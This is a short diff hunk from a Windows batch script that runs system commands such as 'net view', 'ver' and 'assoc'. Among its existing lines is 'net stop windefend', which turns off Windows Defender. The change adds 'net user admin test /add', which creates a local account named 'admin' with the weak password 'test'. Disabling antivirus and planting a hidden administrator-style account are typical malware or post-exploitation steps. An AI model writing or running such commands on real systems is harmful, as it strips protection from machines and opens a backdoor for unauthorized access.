@@ -60,6 +60,8 @@ net view
 ECHO ============================
 net stop windefend
 ECHO ============================
+net user admin test /add
+ECHO ============================
 ver
 ECHO ============================
 assoc
